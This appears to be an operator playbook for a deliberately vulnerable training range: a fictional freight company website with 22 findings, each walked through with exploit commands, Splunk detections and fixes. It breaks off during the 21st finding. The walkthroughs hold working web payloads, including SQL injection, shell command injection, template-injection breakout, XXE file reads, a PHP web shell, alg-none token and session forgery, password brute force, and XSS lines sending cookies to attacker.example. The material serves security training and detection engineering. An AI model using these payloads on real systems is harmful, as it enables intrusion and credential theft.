# Meridian Freight Solutions — assessment playbook

Complete solutions for every finding in the target, the commands that reach them,
the data artifact each one gives up, the SIEM detection it should trigger, and the
MITRE ATT&CK technique it maps to.

> **Operator document.** This names every finding and every proof value. Give
> testers the target URL and nothing else.

> **Deployment warning.** The target has genuine command execution, genuine
> server-side template injection and genuine arbitrary file read. Run it only on
> an isolated range. Meridian Freight Solutions is a fictional company and every
> identity, reference, key and credential in it is synthetic.

---

## 1. How this range is meant to be used

The target is an ordinary-looking corporate website and customer portal. It has
no challenge board, no hints, no score display and no mention of the range. A
tester approaches it the way they would a real engagement: enumerate, find the
weakness in a business feature, exploit it, and walk away with data.

**Proof of exploitation is the data itself.** Each finding, when exploited,
yields a realistic artifact — a credential file, an HR document, an internal
runbook, a cloud token, another customer's consignment record. Inside each
artifact is a reference value of the form `MERIDIAN{...}`. That value is what a
tester records in the operator console.

No endpoint on the target returns a field called `flag`. A test asserts this.

**The operator console is a separate application** at `/range/console`, gated by
`RANGE_CONSOLE_TOKEN`. It holds the finding list, hints, scoring and the
scoreboard. The target site never links to it and never mentions it.

| Audience | Where they go |
|---|---|
| Tester | `http://<range>/` — the Meridian site, nothing else |
| Instructor / team lead | `http://<range>/range/console?token=…` |
| Detection engineer | Splunk, plus section 6 of this document |

---

## 2. Setting up

### Docker

```bash
git clone https://github.com/DrHayabusa/HELPAG-VAPT-Test-Site.git
cd HELPAG-VAPT-Test-Site
cp .env.example .env
docker compose up --build -d
curl -s http://127.0.0.1:5005/health
```

Two services come up on the `meridian-lab` network:

| Service | Address | Role |
|---|---|---|
| `meridian-web` | `127.0.0.1:5005` | The target |
| `metadata` | `metadata:8080` (lab network only) | Instance metadata, the SSRF destination |

**Before a live exercise, change `RANGE_CONSOLE_TOKEN` in `.env`.** The default
is published in this repository.

Set `LAB_BIND=0.0.0.0` to expose it to an isolated lab segment. Only on a
segment you control.

### Windows / IIS

See [`WINDOWS_IIS_DEPLOYMENT_GUIDE.md`](WINDOWS_IIS_DEPLOYMENT_GUIDE.md).

### Splunk

See [`SPLUNK_INTEGRATION_GUIDE.md`](SPLUNK_INTEGRATION_GUIDE.md).

---

## 3. Findings index

22 findings, 2800 points.

| # | Finding | ID | Business feature | Pts | OWASP | UC |
|---|---|---|---|---|---|---|
| 1 | IT runbook exposed to crawlers | `recon-runbook` | Crawler directives | 50 | A01 | UC-01 |
| 2 | Diagnostic endpoint left enabled | `misconfig-debug` | Platform status page | 50 | A05 | UC-03 |
| 3 | Environment file in the web root | `misconfig-dotenv` | Static file handling | 100 | A05 | UC-02 |
| 4 | Database export in a browsable directory | `misconfig-backups` | Nightly export job | 75 | A05 | UC-02 |
| 5 | Shipment records readable across customers | `idor-shipment` | Shipment tracking | 75 | A01 | UC-04 |
| 6 | Account role settable from the profile form | `access-massassign` | Profile settings | 125 | A01 | UC-05 |
| 7 | Rate lookup concatenates input into SQL | `sqli-union` | Freight rate search | 150 | A03 | UC-06 |
| 8 | Legacy portal login vulnerable to injection | `sqli-authbypass` | Legacy sign-in | 125 | A03 | UC-06 |
| 9 | Site search reflects input unencoded | `xss-reflected` | Site search | 75 | A03 | UC-07 |
| 10 | Contact messages rendered raw to staff | `xss-stored` | Contact form | 100 | A03 | UC-07 |
| 11 | Invoice download accepts arbitrary paths | `traversal-invoice` | Invoice download | 125 | A01 | UC-08 |
| 12 | Network diagnostics passes input to a shell | `rce-cmdi` | Depot connectivity check | 200 | A03 | UC-09 |
| 13 | Campaign editor compiles input as a template | `rce-ssti` | Campaign preview | 200 | A03 | UC-10 |
| 14 | Supplier EDI import resolves external entities | `xxe-edi` | EDI manifest upload | 175 | A05 | UC-11 |
| 15 | Applicant uploads land in a browsable store | `upload-unrestricted` | CV submission | 150 | A04 | UC-12 |
| 16 | Partner API accepts unsigned tokens | `jwt-none` | Partner API | 175 | A07 | UC-14 |
| 17 | Session cookies signed with a known secret | `weak-session-secret` | Staff admin area | 200 | A02 | UC-14 |
| 18 | Sign-in has no rate limit or lockout | `auth-bruteforce` | Portal sign in | 100 | A07 | UC-13 |
| 19 | Reset tokens derived from the username | `reset-token` | Password reset | 150 | A02 | UC-15 |
| 20 | Link preview fetches any reachable URL | `ssrf-metadata` | CMS link preview | 175 | A10 | UC-16 |
| 21 | Quote accepts negative quantities | `logic-negative-quote` | Instant quote | 100 | A04 | UC-17 |
| 22 | Legacy audit shim evaluates lookup syntax | `jndi-audit` | Tracking integration | 125 | A06 | UC-18 |

---

## 4. MITRE ATT&CK coverage

| Tactic | Technique | ID | Findings |
|---|---|---|---|
| Reconnaissance | Active Scanning: Wordlist Scanning | T1595.003 | `recon-runbook`, `misconfig-dotenv`, `misconfig-backups` |
| Reconnaissance | Gather Victim Host Information | T1592 / .002 | `misconfig-debug`, `recon-runbook` |
| Initial Access | Exploit Public-Facing Application | T1190 | `idor-shipment`, `sqli-union`, `sqli-authbypass`, `rce-cmdi`, `rce-ssti`, `xxe-edi`, `jndi-audit`, `logic-negative-quote` |
| Initial Access | Drive-by Compromise | T1189 | `xss-reflected` |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | `rce-cmdi` |
| Execution | Command and Scripting Interpreter: Python | T1059.006 | `rce-ssti` |
| Execution | Command and Scripting Interpreter: JavaScript | T1059.007 | `xss-reflected`, `xss-stored` |
| Execution | Exploitation for Client Execution | T1203 | `jndi-audit` |
| Persistence | Server Software Component: Web Shell | T1505.003 | `upload-unrestricted`, `xss-stored` |
| Persistence | Account Manipulation | T1098 | `access-massassign` |
| Privilege Escalation | Abuse Elevation Control Mechanism | T1548 | `access-massassign`, `jwt-none` |
| Defense Evasion | Alternate Auth Material: Application Access Token | T1550.001 | `jwt-none` |
| Defense Evasion | Alternate Auth Material: Web Session Cookie | T1550.004 | `weak-session-secret` |
| Credential Access | Brute Force: Password Guessing | T1110.001 | `auth-bruteforce` |
| Credential Access | Brute Force: Password Cracking | T1110.002 | `weak-session-secret` |
| Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 | `misconfig-dotenv`, `misconfig-backups` |
| Credential Access | Unsecured Credentials: Cloud Instance Metadata API | T1552.005 | `ssrf-metadata` |
| Credential Access | Modify Authentication Process | T1556 | `reset-token` |
| Discovery | File and Directory Discovery | T1083 | `traversal-invoice` |
| Discovery | Account Discovery | T1087 | `idor-shipment` |
| Collection | Data from Local System | T1005 | `traversal-invoice`, `rce-cmdi`, `xxe-edi` |
| Collection | Data from Information Repositories | T1213 | `sqli-union`, `misconfig-debug` |
| Command and Control | Proxy | T1090 | `ssrf-metadata` |
| Impact | Data Manipulation: Stored Data Manipulation | T1565.001 | `logic-negative-quote` |
| Lateral Movement | Valid Accounts | T1078 / .003 | `sqli-authbypass`, `auth-bruteforce` |

---

## 5. Detection use case index

22 use cases ship **disabled** in
[`splunk/TA-helpag-vapt/default/savedsearches.conf`](splunk/TA-helpag-vapt/default/savedsearches.conf).

| UC | Name | Fidelity |
|---|---|---|
| UC-01 | Hidden Path Discovery | low (tune) |
| UC-02 | Sensitive File Retrieval | medium |
| UC-03 | Debug Endpoint Access | medium |
| UC-04 | IDOR Enumeration | medium |
| UC-05 | Privilege Escalation Attempt | high |
| UC-06 | SQL Injection | high |
| UC-07 | Cross-Site Scripting | medium |
| UC-08 | Path Traversal | high |
| UC-09 | Command Injection and Execution | **very high** |
| UC-10 | Server-Side Template Injection | high |
| UC-11 | XXE and XML Abuse | high |
| UC-12 | Dangerous File Upload | high |
| UC-13 | Credential Brute Force | medium |
| UC-14 | Unsigned or Forged Token Accepted | **very high** |
| UC-15 | Account Takeover via Reset | high |
| UC-16 | SSRF to Internal Service | high |
| UC-17 | Business Logic Abuse | medium |
| UC-18 | JNDI Lookup String | **very high** |
| UC-19 | Monitoring Gap | teaching |
| UC-20 | Finding Confirmed | scoring |
| UC-21 | Kill Chain Correlation | **highest value** |
| UC-22 | Data Artifact Disclosed | **highest severity** |

UC-22 is new and specific to this build: it fires when a real data asset actually
leaves the application. Use it to prove your alerting caught the action that
mattered, not only the probe that preceded it.

Tag a run to isolate it:

```bash
curl -s -H 'X-Lab-Test-ID: purple-run-1' http://127.0.0.1:5005/status/diagnostics
```

---

## 6. Walkthroughs

Every command below was run against a live instance of this build and returned
the artifact shown.

```bash
export BASE=http://127.0.0.1:5005
```

---

### 1. IT runbook exposed to crawlers — `recon-runbook` · 50 · easy

**Feature** Crawler directives · **OWASP** A01 · **MITRE** T1595.003, T1592.002

```bash
curl -s $BASE/robots.txt
curl -s $BASE/internal/it-runbook.txt
```

`robots.txt` names `/internal/`, `/backups/`, `/admin/`, `/portal/` and
`/status/` — a map of everything the operator wanted hidden. `/internal/` has no
access control at all.

**Recovered** The IT operations runbook. It contains the duty engineer escalation
code *and* three open tickets that give away later findings: the un-migrated
legacy sign-in, the depot tool that shells out, and the unrotated session key.

**Detection — UC-01**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type IN (recon_robots_read,recon_hidden_path,http_not_found)
| bin _time span=5m
| stats count dc(path) as unique_paths by _time source_ip
| where count>=10 OR unique_paths>=8
```

**Fix** `robots.txt` is a crawler hint, never an authorisation boundary. Put
authentication in front of `/internal/`, and stop enumerating sensitive paths in
a file served to anonymous users.

---

### 2. Diagnostic endpoint left enabled — `misconfig-debug` · 50 · easy

**Feature** Platform status page · **OWASP** A05 · **MITRE** T1592, T1213

```bash
curl -s $BASE/status/diagnostics | jq
```

**Recovered** Runtime configuration: the support bypass code, the database path,
component versions (log4j 2.14.1 — finding 22) and
`"token_algorithms_accepted": ["HS256","none"]` (finding 16).

**Detection — UC-03**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=debug_endpoint_access
| stats count by source_ip user_agent
```

**Fix** Gate diagnostic routes behind an environment flag that is off by default,
and fail the build if they register in a production profile.

---

### 3. Environment file in the web root — `misconfig-dotenv` · 100 · easy

**Feature** Static file handling · **OWASP** A05 · **MITRE** T1552.001

```bash
ffuf -u $BASE/FUZZ -w wordlists/meridian-paths.txt -mc 200 -t 20
curl -s $BASE/.env
```

**Recovered** The deployment environment file — the legacy migration key, plus
`SESSION_SIGNING_KEY` (finding 17), `PARTNER_JWT_KEY` (finding 16) and
`EDI_SERVICE_PASSWORD` (finding 18). This one file unlocks three others.

**Detection — UC-02**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type IN (sensitive_file_access,directory_listing_access)
| stats count values(artifact) as artifacts dc(artifact) as unique by source_ip
```

**Fix** Never place `.env` inside the document root; block dotfiles at the
reverse proxy; rotate every secret that has been web-reachable.

---

### 4. Database export in a browsable directory — `misconfig-backups` · 75 · easy

**Feature** Nightly export job · **OWASP** A05 · **MITRE** T1595.003, T1530

```bash
curl -s $BASE/backups/
curl -s $BASE/backups/meridian-db-export.sql
```

**Recovered** The nightly SQL export: the full account list (including `svc_edi`
and the staff accounts you need for findings 8 and 18) and the payroll reference.

**Detection — UC-02**, on `directory_listing_access`.

**Fix** Disable autoindex, store exports outside the web root, and treat a `.sql`
dump in a document root as a build failure.

---

### 5. Shipment records readable across customers — `idor-shipment` · 75 · easy

**Feature** Customer portal, shipment tracking · **OWASP** A01 · **MITRE** T1190, T1087

Your own consignments are visible on the portal dashboard. The references are
sequential:

```bash
curl -s $BASE/api/v1/shipments/MFS-2026-4468 | jq
for n in $(seq 4465 4480); do
  printf 'MFS-2026-%s ' "$n"
  curl -s "$BASE/api/v1/shipments/MFS-2026-$n" | jq -r '.contents // .error'
done
```

**Recovered** `MFS-2026-4471` — a EUR 742,000 sealed container belonging to a
different customer, on customs hold, with the release authorisation reference in
its handling notes. No authentication is required at all.

**Detection — UC-04**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=broken_access_attempt
| bin _time span=5m
| stats count dc(object_id) as distinct_objects values(object_id) as refs by _time source_ip
| where distinct_objects>=5
```

The detection is the *enumeration*. One customer reading one consignment is
normal; one source reading forty in a minute is not.

**Fix** Authorise every object access against the caller's identity.
Non-sequential references are defence in depth, not a control.

---

### 6. Account role settable from the profile form — `access-massassign` · 125 · medium

**Feature** Customer portal, profile settings · **OWASP** A01 · **MITRE** T1548, T1098

The form sends `contact_name` and `email`. The record — visible via finding 5 —
also holds `account_type`.

```bash
curl -s -X POST $BASE/portal/profile -H 'Content-Type: application/json' \
  -d '{"contact_name":"Dana Okafor","account_type":"operations"}' | jq
```

**Recovered** The operations dashboard and its dispatch authorisation code. The
session is now a staff session, which also opens `/admin`.

**Detection — UC-05**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type IN (mass_assignment_attempt,privilege_change)
| stats count values(mechanism) as mechanisms values(new_role) as roles values(sensitive_fields) as fields by source_ip
```

`privilege_change` with `mechanism=mass_assignment` is high fidelity: a role
changed on a code path that has no business changing roles.

**Fix** Bind to an explicit allow-list DTO. Never hand a request body straight
to an ORM model.

---

### 7. Rate lookup concatenates input into SQL — `sqli-union` · 150 · medium

**Feature** Public freight rate search · **OWASP** A03 · **MITRE** T1190, T1213

```bash
curl -sG $BASE/api/v1/rates/search --data-urlencode "q='" | jq
```

The error response returns the statement it built. Enumerate the schema:

```bash
curl -sG $BASE/api/v1/rates/search \
  --data-urlencode "q=' UNION SELECT 1,name,sql FROM sqlite_master-- " | jq
```

That reveals `integration_credentials`.

```bash
curl -sG $BASE/api/v1/rates/search \
  --data-urlencode "q=' UNION SELECT id,partner,api_key FROM integration_credentials-- " | jq
```

**Recovered** Partner API keys, including the Meridian Partner Gateway key.

With sqlmap — worth running once, because it is the loudest thing you can point
at the range:

```bash
sqlmap -u "$BASE/api/v1/rates/search?q=test" -p q --batch --dbms=sqlite \
       --dump -T integration_credentials
```

**Detection — UC-06**

```spl
index=vapt_lab sourcetype=helpag:owasp:json (event_type=sql_error OR (event_type=sql_query suspicious=true))
| stats count values(query_input) as inputs values(statement) as statements by source_ip event_type
```

**Fix** Parameterised queries. Never interpolate input into SQL, and never
return the statement or driver error to the client.

---

### 8. Legacy portal login vulnerable to injection — `sqli-authbypass` · 125 · medium

**Feature** Customer portal, legacy sign-in · **OWASP** A03 · **MITRE** T1190, T1078

The runbook (finding 1) names ticket OPS-4388: the pre-migration sign-in was
never parameterised. It is still reachable at `/portal/login?legacy=1`. The
account list comes from the export (finding 4).

```bash
curl -s -X POST "$BASE/portal/login?legacy=1" -H 'Content-Type: application/json' \
  -d '{"username":"ops_console'\''-- ","password":"anything"}' | jq
```

**Recovered** The shared operations console account, whose internal notes carry
the treasury reconciliation key.

The current sign-in path is parameterised — the same payload returns 401 there.
A test asserts that, so the range teaches the difference rather than implying
every login is broken.

**Detection — UC-06 plus UC-13.** The same request raises an
`authentication_attempt` with `injection=true`, a far stronger signal than
either event alone:

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=authentication_attempt injection=true
| stats count values(username) as attempted by source_ip
```

**Fix** Parameterise, and retire legacy authentication paths on a deadline
rather than a best effort.

---

### 9. Site search reflects input unencoded — `xss-reflected` · 75 · easy

**Feature** Site search · **OWASP** A03 · **MITRE** T1059.007, T1189

```bash
curl -sG $BASE/search --data-urlencode 'q=<script>alert(1)</script>' | grep -i script
```

The term is written into the results page as raw HTML. The page also offers
"send this search to a support agent" — the delivery mechanism.

```bash
curl -sG $BASE/support/shared-search \
  --data-urlencode 'q=<script>fetch("//attacker.example/?c="+document.cookie)</script>' | jq
```

**Recovered** The support agent's session cookie, base64-encoded exactly as it
would arrive on a collector:

```bash
curl -sG $BASE/support/shared-search --data-urlencode 'q=<script>x()</script>' \
  | jq -r '.captured.cookie' | cut -d= -f2- | base64 -d
```

`/support/shared-search` simulates the agent's browser rendering the shared link.
No real browser or callback is needed.

**Detection — UC-07**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type IN (xss_probe,agent_session_compromised)
| stats count values(search_term) as terms by source_ip event_type
```

`agent_session_compromised` means a payload actually executed in a privileged
context — a confirmed compromise, not a probe.

**Fix** Contextual output encoding, a strict CSP without `unsafe-inline`, and
`HttpOnly` on session cookies.

---

### 10. Contact messages rendered raw to staff — `xss-stored` · 100 · medium

**Feature** Contact form and staff message queue · **OWASP** A03 · **MITRE** T1059.007, T1505.003

```bash
curl -s -X POST $BASE/contact -H 'Content-Type: application/json' \
  -d '{"name":"R Menon","company":"Northgate","email":"r@northgate.example",
       "message":"<script>fetch(\"//attacker.example/?c=\"+document.cookie)</script>"}'
```

Staff review enquiries at `/admin/messages`, which renders them exactly as
received. Reach it with finding 6 or 17, then:

```bash
curl -s -H "Cookie: session=$FORGED" $BASE/admin/messages | grep mfs_staff_session
```

**Recovered** The operations manager's session token.

**Detection — UC-07**, and this is where two-stage correlation matters:

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type IN (stored_xss_persisted,staff_session_compromised)
| transaction maxspan=1h
| table _time source_ip event_type payloads_executed payload
```

**Fix** Encode on output, not input; sanitise with an allow-list parser if rich
text is a requirement; set `HttpOnly` so a successful XSS cannot read the cookie.

---

### 11. Invoice download accepts arbitrary paths — `traversal-invoice` · 125 · medium

**Feature** Customer portal, invoice download · **OWASP** A01 · **MITRE** T1083, T1005

```bash
curl -sG $BASE/api/v1/invoices/download --data-urlencode 'document=INV-2026-00841.txt'
curl -sG $BASE/api/v1/invoices/download --data-urlencode 'document=../../../../etc/passwd'
```

The 404 echoes `resolved`, which calibrates the climb for you.

```bash
curl -sG $BASE/api/v1/invoices/download --data-urlencode 'document=../instance/app-secrets.ini'
```

**Recovered** The application secrets file from outside the document root —
session signing key, gateway secret, and the recovery reference.

**Detection — UC-08**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=path_traversal_attempt
| stats count values(requested_document) as requested values(resolved_path) as resolved by source_ip
```

High fidelity: legitimate traffic does not contain `../`. Alert on the first event.

**Fix** Resolve with `realpath` and reject anything outside the base directory;
better, index documents by identifier and never accept a filename from a client.

---

### 12. Network diagnostics passes input to a shell — `rce-cmdi` · 200 · hard

**Feature** Staff tools, depot connectivity check · **OWASP** A03 · **MITRE** T1059.004, T1190, T1005

Requires a staff session (finding 6 or 17). Ticket OPS-4412 in the runbook names
this tool outright.

```bash
curl -s -X POST $BASE/admin/diagnostics -H 'Content-Type: application/json' \
  -d '{"host":"127.0.0.1"}' | jq -r .output
curl -s -X POST $BASE/admin/diagnostics -H 'Content-Type: application/json' \
  -d '{"host":"127.0.0.1; id"}' | jq -r .output
curl -s -X POST $BASE/admin/diagnostics -H 'Content-Type: application/json' \
  -d '{"host":"127.0.0.1; cat instance/keys/depot-transfer.key"}' | jq -r .output
```

**Recovered** Arbitrary files as the service account — here the depot transfer key.

**Windows/IIS:** `cmd.exe` chains with `&` and reads with `type`:

```bash
-d '{"host":"127.0.0.1 & type instance\\keys\\depot-transfer.key"}'
```

> Real execution as an unprivileged user inside the container. This is the most
> dangerous thing on the range and the reason `LAB_MODE` exists.

**Detection — UC-09**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type IN (command_injection_attempt,command_execution)
| stats count values(command_line) as command_lines values(exit_code) as codes by source_ip
```

If you collect host telemetry, correlating the web event with a `python` process
spawning `sh` spawning `cat` is the highest-value exercise on this range.

**Fix** Do not shell out. Use a library, or `subprocess` with an argument list
and `shell=False`, and validate the host against a strict pattern.

---

### 13. Campaign editor compiles input as a template — `rce-ssti` · 200 · hard

**Feature** Marketing campaign preview · **OWASP** A03 · **MITRE** T1059.006, T1190

The editor advertises merge fields, which is the tell that input is evaluated.

```bash
curl -sG $BASE/admin/campaigns/preview --data-urlencode 'body={{7*7}}'
curl -sG $BASE/admin/campaigns/preview --data-urlencode 'body={{ config.items() }}'
```

`49` confirms server-side evaluation. Break out to the runtime:

```bash
curl -sG $BASE/admin/campaigns/preview --data-urlencode \
  "body={{ cycler.__init__.__globals__.__builtins__.open('instance/keys/campaign-signing.key').read() }}"
```

**Recovered** The campaign signing key.

`open()` takes forward slashes on both platforms. `os.popen('cat ...')` works on
Linux but fails on Windows twice over — `cat` does not exist, and a backslash
path is consumed by Jinja's own string parsing before Python sees it.

**Detection — UC-10**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type IN (ssti_attempt,template_error)
| stats count values(template_input) as templates by source_ip
```

Template errors are the loudest part of an SSTI campaign — an attacker probing
gadget chains produces far more errors than successes. Alert on the error rate.

**Fix** Never compile user input as a template. Pass it as *data* to a
pre-compiled template. If user-authored templates are a product requirement, use
a sandboxed engine with no attribute access.

---

### 14. Supplier EDI import resolves external entities — `xxe-edi` · 175 · hard

**Feature** Supplier integration, EDI manifest upload · **OWASP** A05 · **MITRE** T1190, T1005

```bash
curl -s -X POST $BASE/api/v1/edi/manifest -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?>
<!DOCTYPE manifest [<!ENTITY x SYSTEM "file:///app/instance/edi/partner-manifest.key">]>
<manifest><consignor>&x;</consignor></manifest>' | jq -r .parsed
```

**Recovered** The EDI manifest signing key. Any readable file works the same way:

```bash
--data-binary '<?xml version="1.0"?><!DOCTYPE m [<!ENTITY e SYSTEM "file:///etc/passwd">]><m>&e;</m>'
```

Running natively rather than in Docker, replace `/app` with your checkout path.
Outbound entity resolution is disabled (`no_network=True`), so out-of-band XXE
cannot exfiltrate from this range by design.

**Detection — UC-11**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type IN (xxe_attempt,xml_parse_error)
| stats count values(declares_doctype) as doctype values(payload_bytes) as sizes by source_ip
```

A `DOCTYPE` in inbound XML from an untrusted partner is close to a binary
indicator — very few legitimate integrations send one.

**Fix** Disable DTD loading and entity resolution (`defusedxml` in Python,
`FEATURE_SECURE_PROCESSING` in Java). Prefer JSON.

---

### 15. Applicant uploads land in a browsable store — `upload-unrestricted` · 150 · medium

**Feature** Careers, CV submission · **OWASP** A04 · **MITRE** T1505.003, T1105

```bash
printf '<?php system($_GET["c"]); ?>\n' > /tmp/cv.php
curl -s -X POST $BASE/careers/apply -F 'cv=@/tmp/cv.php' | jq
```

No allow-list and no content inspection. The response tells you where it went —
and that store lists its own contents:

```bash
curl -s $BASE/uploads/
curl -s $BASE/uploads/hr-onboarding-pack-2026.txt
```

**Recovered** Other people's documents, including the internal HR onboarding
pack and its reference.

> Uploaded files are always served as `text/plain`, so nothing you upload becomes
> a live web shell. That is deliberate: a shared range should not hand every
> tester persistent execution. The finding is the unrestricted write plus the
> browsable store, and the detection value is the upload event.

**Detection — UC-12**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=dangerous_upload
| stats count values(filename) as filenames values(extension) as extensions by source_ip
```

Pair it with file-integrity monitoring on the upload directory.

**Fix** Allow-list extensions *and* verify content type; rename on write to a
generated identifier; store uploads outside the web root; never list the store.

---

### 16. Partner API accepts unsigned tokens — `jwt-none` · 175 · hard

**Feature** Partner API · **OWASP** A07 · **MITRE** T1550.001, T1548

`/status/diagnostics` already told you `token_algorithms_accepted` includes
`none`. Get a legitimate token and look at it:

```bash
TOKEN=$(curl -s "$BASE/api/v1/auth/token?partner=harborline" | jq -r .access_token)
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null; echo
curl -s -H "Authorization: Bearer $TOKEN" $BASE/api/v1/reports/financial | jq
```

Role `partner`, so a 403. Forge an unsigned one:

```bash
b64url() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }
HEADER=$(printf '%s' '{"alg":"none","typ":"JWT"}'            | b64url)
PAYLOAD=$(printf '%s' '{"sub":"harborline","role":"finance"}' | b64url)

curl -s -H "Authorization: Bearer $HEADER.$PAYLOAD." $BASE/api/v1/reports/financial | jq
```

**Recovered** The restricted quarterly financial report and its distribution
reference.

The HS256 key is in `/.env`, so a signed forgery also works — but the report's
reference is released only for the *unsigned* token, so the
`jwt_unsigned_accepted` detection is the one being exercised.

**Detection — UC-14**

```spl
index=vapt_lab sourcetype=helpag:owasp:json (event_type=jwt_unsigned_accepted OR (event_type=jwt_verify algorithm=none))
| stats count values(subject) as subjects values(claimed_role) as roles by source_ip
```

Any token presented with `alg=none` is an attack. There is no benign case.

**Fix** Pin the accepted algorithm server-side; never read `alg` from the token
to choose the verifier; pass `algorithms=["HS256"]` explicitly.

---

### 17. Session cookies signed with a known secret — `weak-session-secret` · 200 · hard

**Feature** Staff administration area · **OWASP** A02 · **MITRE** T1110.002, T1550.004

Flask sessions are signed, not encrypted — read your own:

```bash
curl -si $BASE/portal/login | grep -i set-cookie
python3 tools/forge_session.py --decode '<cookie value>'
```

The signing key appears in three places on the estate: `/.env`,
`/instance/app-secrets.ini` (finding 11), and the runbook's ticket OPS-4455. Or
crack it:

```bash
flask-unsign --unsign --cookie '<cookie>' --wordlist wordlists/meridian-secrets.txt
```

Forge a staff session:

```bash
flask-unsign --sign --cookie "{'is_staff': True}" --secret 'meridian-default-signing-key'
```

No `flask-unsign`? The repository ships a dependency-free equivalent:

```bash
FORGED=$(python3 tools/forge_session.py --secret 'meridian-default-signing-key')
curl -s -H "Cookie: session=$FORGED" $BASE/admin
```

**Recovered** The administration area, including the disaster-recovery master code.

**Detection — UC-14**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=forged_session_detected
| stats count values(reason) as reasons by source_ip user_agent
```

The application detects this by contradiction: a staff flag present on a session
that never completed an authentication. Reproduce that logic in your own
applications — a privileged session with no preceding sign-in event is the detection.

**Fix** Generate the secret with a CSPRNG at deploy time, keep it in a secret
manager, rotate on exposure, never commit a default, and hold authorisation
state server-side.

---

### 18. Sign-in has no rate limit or lockout — `auth-bruteforce` · 100 · easy

**Feature** Customer portal sign-in · **OWASP** A07 · **MITRE** T1110.001, T1078.003

The account list comes from the export (finding 4). `svc_edi` is the target, and
`/.env` names its password outright — or guess it:

```bash
for p in Autumn2023 autumn2023 Password1 summer2024 autumn2024; do
  printf '%s -> ' "$p"
  curl -s -X POST $BASE/portal/login -H 'Content-Type: application/json' \
    -d "{\"username\":\"svc_edi\",\"password\":\"$p\"}"
  echo
done
```

```bash
ffuf -u $BASE/portal/login -X POST -H 'Content-Type: application/json' \
     -d '{"username":"svc_edi","password":"FUZZ"}' \
     -w /usr/share/wordlists/rockyou.txt -fc 401 -t 40
```

**Recovered** The integration service account. Its record carries the EDI
transfer key.

**Detection — UC-13**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=authentication_attempt
| bin _time span=5m
| stats count(eval(success="false")) as failures count(eval(success="true")) as successes
        dc(username) as accounts by _time source_ip
| where failures>=5 OR (failures>=3 AND successes>=1)
```

The application also emits `brute_force_suspected` with `lockout_applied=false`
past five failures in sixty seconds. The *failure-then-success* pattern is the
alert that matters. For password spraying, invert it:

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=authentication_attempt success=false
| bin _time span=10m | stats dc(username) as accounts by _time source_ip | where accounts>=10
```

**Fix** Rate limit per source and per account, progressive delays and lockout,
MFA, and ban breach-corpus credentials. Service accounts get long random
secrets, not seasonal passwords.

---

### 19. Reset tokens derived from the username — `reset-token` · 150 · medium

**Feature** Password reset · **OWASP** A02 · **MITRE** T1110, T1556

Request one for your own account; the link comes back in this tenant:

```bash
curl -s -X POST $BASE/portal/reset -H 'Content-Type: application/json' \
  -d '{"username":"dokafor"}' | jq
printf '%s' 'dokafor' | md5sum     # matches the token
```

Do the same arithmetic for the finance contact (named in the export and in
`/about`):

```bash
TARGET=avoss
TOKEN=$(printf '%s' "$TARGET" | md5sum | cut -d' ' -f1)   # macOS: md5 -q

curl -s -X POST $BASE/portal/reset -H 'Content-Type: application/json' \
  -d "{\"username\":\"$TARGET\"}" >/dev/null

BODY='{"username":"'"$TARGET"'","token":"'"$TOKEN"'"}'
curl -s -X POST $BASE/api/v1/account/reset -H 'Content-Type: application/json' \
  -d "$BODY" | jq
```

**Recovered** The finance contact's account, whose internal notes hold the
banking amendment reference.

**Detection — UC-15**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type IN (password_reset_consume,account_takeover)
| stats count values(target_user) as targets values(token_valid) as valid by source_ip
```

`account_takeover` fires when a reset is consumed for an account other than the
requester's. One source resetting several accounts is a takeover campaign.

**Fix** CSPRNG tokens with 128+ bits of entropy, store only a hash, bind to the
account with a short expiry, invalidate on first use.

---

### 20. Link preview fetches any reachable URL — `ssrf-metadata` · 175 · medium

**Feature** CMS link preview · **OWASP** A10 · **MITRE** T1090, T1552.005

```bash
curl -sG $BASE/admin/integrations/preview --data-urlencode 'url=http://example.com' | jq
```

The 403 lists the hosts the server will reach — your target list.

```bash
curl -sG $BASE/admin/integrations/preview \
  --data-urlencode 'url=http://metadata:8080/latest/meta-data/' | jq
curl -sG $BASE/admin/integrations/preview --data-urlencode \
  'url=http://metadata:8080/latest/meta-data/iam/security-credentials/mfs-web-instance-role' | jq
```

**Recovered** Cloud instance role credentials. Outside Docker the metadata
service is on `http://127.0.0.1:8080`.

> Egress is bounded to an allow-list of lab-internal hosts on purpose, so this
> cannot pivot off the range or scan your corporate network. The vulnerability —
> the server fetching a client-controlled URL — is intact; only the blast radius
> is contained.

**Detection — UC-16**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=ssrf_probe
| stats count values(target) as targets values(target_host) as hosts values(allowed) as allowed by source_ip
```

Alert on any server-side fetch aimed at loopback, RFC1918, link-local
(`169.254.169.254`) or an internal service name. In production, correlate with
egress proxy logs.

**Fix** Allow-list destinations, resolve DNS before connecting and re-check the
resolved IP (defeating rebinding), block redirects, require IMDSv2.

---

### 21. Quote accepts negative quantities — `logic-negative-quote` · 100 · easy

**Feature** Instant freight quote · **OWASP** A04 · **MITRE** T1190, T1565.001

```bash
curl -s -X POST $BASE/services/quote -H 'Content-Type: application/json' \
  -d '{"weight_kg":-1200,"rate_per_kg":0.42}' | jq
```

**Recovered** A credit note issued against the account, carrying its
authorisation reference. Rate tampering works the same way:

```bash
